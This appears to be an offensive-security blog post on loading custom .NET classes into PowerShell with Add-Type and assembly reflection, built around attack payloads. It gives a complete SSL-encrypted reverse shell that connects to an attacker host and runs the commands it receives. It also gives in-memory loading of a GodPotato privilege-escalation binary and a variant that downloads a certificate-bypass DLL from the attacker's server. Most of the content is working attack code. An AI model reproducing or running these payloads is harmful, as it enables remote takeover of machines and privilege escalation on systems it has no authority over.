
(a) Loading Custom .NET Classes into a PowerShell session via Add-Type PowerShell is neat because it allows us to write native C# code and load them into the current session with different types of tools, most common being `Add-Type`. My personal most common use for it is using custom code to effectively disable the server certificate check that `[System.Net.WebClient]` uses -- allowing for communication with a simple web server over HTTPS using self signed certificates instead of HTTP.  
For another example, below is an SSL encrypted PowerShell reverse shell payload using a custom .NET Class:

```powershell
### PowerShell 5.0+ ###
# $IPAddress = "<attacker_ip>"
# $Port = <listening_port>
$SSC = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass
    (
        Object obj,
        X509Certificate cert,
        X509Chain chain,
        SslPolicyErrors errors
    )
    {
        return true;
    }
    public static SslStream Stream(TcpClient c)
    {
        return new SslStream(c.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
}
'@
Add-Type $SSC
$Client = [System.Net.Sockets.TcpClient]::new("$IPAddress",$Port)
$Stream = [SelfSignedCerts]::Stream($Client)
$Stream.AuthenticateAsClient("")
[byte[]]$Buffer = 0..65535 | % {0}
$LastError = $Error[0]
while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {
    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)
    $Execution = (iex $Command *>&1 | Out-String)
    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += "$LastError`n" }
    $OutString = $Execution + "PS " + (PWD).Path + "> "
    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
    $Stream.Write($OutBytes,0,$OutBytes.Length)
    $Stream.Flush()
}
$Client.Close()
```

(b) Loading Custom .NET Classes into a PowerShell session via Assembly Reflection Another really neat method of loading powerful C# tomfoolery into session is via reflection -- specifically using `[System.Reflection.Assembly]::Load(<intended_assembly_here>)`. This method is especially powerful because you can load complete C# binaries into session. When combining this with `[System.Net.WebClient]`, you can host malicious C# binaries on your attacker and load them into session on a compromised host. Prime example of this is exploiting `SeImpersonatePrivilege` for privilege escalation all from memory.  
Below is an example of this using my GodPotato fork: [https://github.com/tylerdotrar/GodPotatoNet](https://github.com/tylerdotrar/GodPotatoNet "https://github.com/tylerdotrar/GodPotatoNet")

```
# C# Reflection in PowerShell
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/GodPotatoNet.exe"))
[GodPotatoNet.Program]::Main(@('-cmd','<command>'))
```

(c) Tying it all Together Turns out `Add-Type` has the ability to compile really simple assemblies (`.dll`) instead of just loading them into session. Meaning instead of needing Visual Studio to compile a binary for something simple like a self-signed certificate bypass, we can just create a small `.dll` using `Add-Type`, host it on our attacker, and load it via `[System.Reflection.Assembly]` to achieve the same end goal.

For this final example, I'll recreate the Reverse Shell payload from section (a), however instead of loading the `[SelfSignedCerts]` class into session via `Add-Type`, I've instead used `Add-Type $SSC -OutputAssembly SSC.dll` to create an `SSC.dll` assembly from the original section (a) code, and began hosting it on a simple web server on my attacker. Now for the payload, instead of including the entire C# source code, we can replace that code snippet in our payload with an assembly reflection pointing to the hosted `SSC.dll`.

```powershell
### PowerShell 5.0+ ###
# $IPAddress = "<attacker_ip>"
# $Port = <listening_port>
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/SSC.dll"))
$Client = [System.Net.Sockets.TcpClient]::new("$IPAddress",$Port)
$Stream = [SelfSignedCerts]::Stream($Client)
$Stream.AuthenticateAsClient("")
[byte[]]$Buffer = 0..65535 | % {0}
$LastError = $Error[0]
while (($Data = $Stream.Read($Buffer,0,$Buffer.Length)) -ne 0) {
    $Command   = [System.Text.ASCIIEncoding]::new().GetString($Buffer,0,$Data)
    $Execution = (iex $Command *>&1 | Out-String)
    if ($Error[0] -ne $LastError) { $LastError = $Error[0]; $Execution += "$LastError`n" }
    $OutString = $Execution + "PS " + (PWD).Path + "> "
    $OutBytes  = ([Text.Encoding]::ASCII).GetBytes($OutString)
    $Stream.Write($OutBytes,0,$OutBytes.Length)
    $Stream.Flush()
}
$Client.Close()
```

(d) Conclusion All methods have pros and cons -- sometimes it's easier to just leave the code snippet in the payload and add it to session via `Add-Type` -- sometimes size is a concern, so we just want to point to it via reflection, etc etc etc.